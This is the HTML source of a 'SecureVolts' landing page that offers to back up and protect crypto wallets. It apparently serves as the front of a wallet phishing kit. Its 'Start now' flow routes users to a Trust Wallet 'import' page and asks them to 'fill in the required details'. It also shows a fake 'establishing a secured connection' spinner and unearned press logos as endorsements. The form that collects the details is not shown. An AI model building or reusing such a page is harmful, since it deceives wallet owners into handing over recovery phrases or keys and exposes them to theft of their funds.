<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./lib/css/bootstrap.min.css">
    <link rel="stylesheet" href="./css/style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,100;9..40,200;9..40,300;9..40,400;9..40,500;9..40,600;9..40,700;9..40,800;9..40,900;9..40,1000&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/1e85d9a7d3.js" crossorigin="anonymous"></script>
    <title>Document</title>
</head>
<body>
  
  <nav class="navbar navbar-expand-lg shadow-sm py-3 fixed-top nav-cust blur">
    <div class="container-fluid">
      <a class="navbar-brand logo" href="#"><img src="./img/lfk.png" alt=""></a>
      <button onclick="chooseWallet()" class="startnow2 navbar-toggler" style="line-height: 0 !important;">
        Start now
        <i class="fa fa-arrow-right" aria-hidden="true"></i>
      </button>
      <!-- <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarText" aria-controls="navbarText" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button> -->
      <div class="collapse navbar-collapse" id="navbarText">
        <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
          <li class="nav-item">
            <a class="nav-link" aria-current="page" href="#howitworkssection">How it works</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="#feature-section">Features</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="#">Security</a>
          </li>
        </ul>
        <div class="navbar-text ms-auto">
          <a href="https://zayydev.online">
            <button class="startnow">
              Start now
              <i class="fa fa-arrow-right" aria-hidden="true"></i>
            </button>
          </a>
        </div>
      </div>
    </div>
  </nav>

  <div id="spinnerall">
    <style>
      #spinnerall, #lock {
        display: none;
      }
    </style>
    <div class="spinner-con d-flex align-items-center justify-content-center w-100" style="height: 100vh; flex-direction: column;">
      <div class="spinner-border" role="status">
        <span class="visually-hidden">Loading...</span>
      </div>
      <i id="lock" class="fa fa-lock" style="font-size: 30px;" aria-hidden="true"></i>
      <small class="pt-2" id="smalltxt">establishing a secured connection...</small>
    </div>
  </div>

  <header class="paddingTop-increase blur">
    <div class="container col-xxl-8 px-3 pt-lg-0 pt-5">
      <div class="row align-items-center pb-4">
        <div class="col-lg-6 mb-lg-0 mb-5">
          <h1 class="display-5 fw-bold lh-2 mb-2 mt-2 mb-lg-4 header-head">Your gateway to the decentralized web</h1>
          <p class="lead header-par mb-3 mt-4">Connect your wallet for easy backup and shield against fraud and crypto hack.</p>
          <button class="startnow3 mb-4" onclick="chooseWallet()">
            Start now
            <i class="fa fa-arrow-right" aria-hidden="true"></i>
          </button>
        </div>
        <div class="col-lg-6 mx-auto mt-lg-0 mt-2 lg-img">
          <div class="img-type">
            <img src="./img/laptop.png" alt="" class="d-block mx-lg-auto img-fluid">
            <div class="circle1">
            </div>
            <div class="circle2">
            </div>
            <div class="circle3">
            </div>
            <div class="circle4">
            </div>
          </div>
        </div>
        
        <div class="col-lg-6 mx-auto mt-lg-0 mt-5 pt-lg-0 sm-img">
          <div class="img-type">
            <img src="./img/laptop.png" alt="" class="d-block mx-lg-auto img-fluid">
            <div class="circle1">
            </div>
            <div class="circle2">
            </div>
            <div class="circle3">
            </div>
            <div class="circle4">
            </div>
          </div>
        </div>
      </div>
    </div>
  </header>

  <section id="selectCon">
    <div class="select-con d-flex align-items-center justify-content-center w-100 pt-lg-5 pb-lg-5" style="height: 100vh;">
    <div class="container">
      <div class="row">
        <div class="col-lg-5 mx-auto">
           <div class="select-wallet shadow" style="height: 70vh; overflow: auto;">
            <div class="select-title text-center p-2 sticky-top bg-light">
              <h3>Supported wallet</h3>
            </div>
            <hr class="m-0">
            <div class="select-body">
              <a target="_blank" href="./details/import" rel="noopener noreferrer">
                <div class="select-first d-flex align-items-center p-3">
                  <img class="me-3 shadow-sm" src="./img/wallet/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0.jpg" alt="">
                  <div class="select-p">
                    <p>Trust Wallet</p>
                    <small style="font-size: 10px;">available</small>
                  </div>
                </div>
              </a>
            </div>
           </div>
        </div>
      </div>
    </div>
  </div>
  </section>

  <section class="blur" style="padding-top: 20%;">
    <div class="container pt-lg-0 pt-5">
      <p class="text-center company mb-5" style="color: #3d3d3d;">
        Join these companies in saving hundreds of hours a year
      </p>
      <div class="d-flex flex-wrap align-items-center justify-content-evenly company-img">
        <img src="./img/blocknomi.png" alt="">
        <img src="./img/coindesk-1.png" alt="">
        <img src="./img/forbes.png" alt="">
        <img src="./img/fortune.png" alt="">
        <img src="./img/rtl-bulevard.png" alt="">
      </div>
    </div>
  </section>

  <section class="blur" style="padding-top: 13%;">
    <div class="container mt-lg-5 mt-5 pb-5">
      <div class="row">
        <div class="col-lg-6 align-self-center mb-lg-5 mb-4">
          <div class="feat mx-auto" style="width: 343px;">
            <h3>Seamless Connection</h3>
            <p>Connect to the future of finance with seamless, secure, and decentralized access to your digital assets.</p>
            <a href="javascript:void(0)" onclick="chooseWallet()">Start now <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
          </div>
        </div>
        <div class="col-lg-6 mx-auto mb-5 pic text-center">
          <img src="./img/tu.png" class="mx-lg-auto img-fluid" width="400px" alt="">
        </div>
      </div>
    </div>
  </section>

  <section class="pt-5 pb-5 blur">
    <div class="container">
      <div class="row flex-lg-row flex-column-reverse">
        <div class="col-lg-6 mx-auto mb-5 pic text-center">
          <img src="./img/yu.jpg" class="mx-lg-auto img-fluid" width="400px" alt="">
        </div>
        <div class="col-lg-6 align-self-center mb-lg-5 mb-4">
          <div class="feat mx-auto" style="width: 343px;">
            <h3>Buy, store, send and swap tokens</h3>
            <p>SecureVolts equips you with a key vault, secure login, token wallet, and everything you need to manage your digital assets.</p>
            <a href="javascript:void(0)" onclick="chooseWallet()">Start now <i class="fa fa-arrow-right" aria-hidden="true"></i></a>
          </div>
        </div>
      </div>
    </div>
  </section>

  <section id="feature-section" class="bg-dark blur" style="padding-top: 120px; padding-bottom: 120px;">
    <div class="container">
      <div class="features text-center mx-auto mb-5">
        <h2>Features</h2>
        <p>Secure Volts is a powerful tool that allows you to connect your wallet to dApps and websites. This gives you access to a wide range of features and benefits.</p>
      </div>
      <div class="row">
        <div class="col-lg-4 align-self-center mb-lg-0 mb-5">
          <div class="featuresitem me-5 ms-5">
            <div class="featuresheader d-flex align-items-center mb-3">
              <i class="me-3 fa fa-shield" aria-hidden="true"></i>
              <h2>Secure and Decentralized</h2>
            </div>
            <div class="featuresbody">
              <p>Enjoy a secure connection between your wallet and dApps without compromising on decentralization.</p>
            </div>
          </div>
        </div>

        <div class="col-lg-4 align-self-center mb-lg-0 mb-5">
          <div class="featuresitem me-5 ms-5">
            <div class="featuresheader d-flex align-items-center mb-3">
              <i class="me-3 fa fa-connectdevelop" aria-hidden="true"></i>
              <h2>Seamless Integration</h2>
            </div>
            <div class="featuresbody">
              <p>Connect your favorite wallets with various dApps effortlessly.</p>
            </div>
          </div>
        </div>

        <div class="col-lg-4 align-self-center">
          <div class="featuresitem me-5 ms-5">
            <div class="featuresheader d-flex align-items-center mb-3">
              <i class="me-3 fa fa-check-square" aria-hidden="true"></i>
              <h2>User Control</h2>
            </div>
            <div class="featuresbody">
              <p>Have complete control over your data and transactions.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>

  <section id="howitworkssection" class="blur" style="padding-top: 12%; padding-bottom: 5%;">
    <div class="container pt-lg-0 pt-5">
      <div class="row">
        <div class="col-lg-6">
          <div class="howitworks">
            <h2>How it works</h2>
            <ol>
              <li><p><b>Connect your wallet:</b> Open Secure Volts website and look for the Wallet Connect button. Once you find it, click on it and select your wallet from the list of supported wallets.</p></li>
              <li><p><b>Fill in the required field:</b> After selecting the wallet you want to connect fill in the required details in the field on the next prompt.</p></li>
              <li><p><b>Approve transactions:</b> When you want to interact with our website, your wallet will ask for your approval. Simply review the transaction details and approve it if you agree with them.</p></li>
            </ol>
          </div>
        </div>
        <div class="col-lg-6 mx-auto mb-5 pic text-center">
          <img src="./img/ht.jpg" class="mx-lg-auto img-fluid" width="400px" alt="">
        </div>
      </div>
    </div>
  </section>

<hr>

  <section class="pt-5 pb-5 blur">
    <div class="container">
      <div class="row">
        <div class="col-lg-6 mx-auto">
          <div class="newsletter text-center">
            <h3>Receive our Newsletter</h3>
            <p class="mb-5">Sign up to receive updates and announcements</p>
            <a href="#">Sign up</a>
          </div>
        </div>
      </div>
    </div>
  </section>

  <footer class="pt-5 pb-5 blur" style="background-color: rgb(233, 235, 238);">
    <div class="container">
      <div class="footerlogo"></div>
      <div class="row">
        <div class="col-lg-4 mb-lg-0 mb-4">
          <div class="footerhead">
            <h3 class="mb-3">Learn more</h3>
            <ul class="p-0 footerlist">
              <li><a href="javascript:void(0)" onclick="chooseWallet()">Get started</a></li>
              <li><a href="#howitworkssection">How it works</a></li>
              <li><a href="#feature-section">Features</a></li>
              <li><a href="javascript:void(0)">News</a></li>
              <li><a href="javascript:void(0)">Security</a></li>
            </ul>
          </div>
        </div>

        <div class="col-lg-4 mb-lg-0 mb-4">
          <div class="footerhead">
            <h3 class="mb-3">Legal</h3>
            <ul class="p-0 footerlist">
              <li><a href="javascript:void(0)">Privacy Policy</a></li>
              <li><a href="javascript:void(0)">Terms of Use</a></li>
              <li><a href="javascript:void(0)">Contributor License Agreement</a></li>
              <li><a href="javascript:void(0)">Site Map</a></li>
            </ul>
          </div>
        </div>

        <div class="col-lg-4 mb-lg-0 mb-4">
          <div class="footerhead">
            <h3 class="mb-3">Contact us</h3>
            <ul class="p-0 footerlist">
              <li><a href="">support@securevolts.com</a></li>
              <li><a href="">info@securevolts.com</a></li>
              <li><a href="">connect@securevolts.com</a></li>
              <li><a href="">admin@securevolts.com</a></li>
            </ul>
          </div>
        </div>

        <div class="col-lg-6 foot">
          <p>&copy; <script>
            document.write(new Date().getFullYear())
          </script> <small>SecureVolts. All Right Reserved</small></p>
        </div>
      </div>
    </div>
  </footer>

<script src="./lib/jquery-3.7.1.min.js"></script>
<script src="https://unpkg.com/@popperjs/core@2"></script>
<script src="https://unpkg.com/typed.js@2.0.16/dist/typed.umd.js"></script>
<script src="https://use.fontawesome.com/e838647e51.js"></script>
<script src="./lib/js/bootstrap.min.js"></script>
<script src="./js/index.js"></script>
</body>
</html>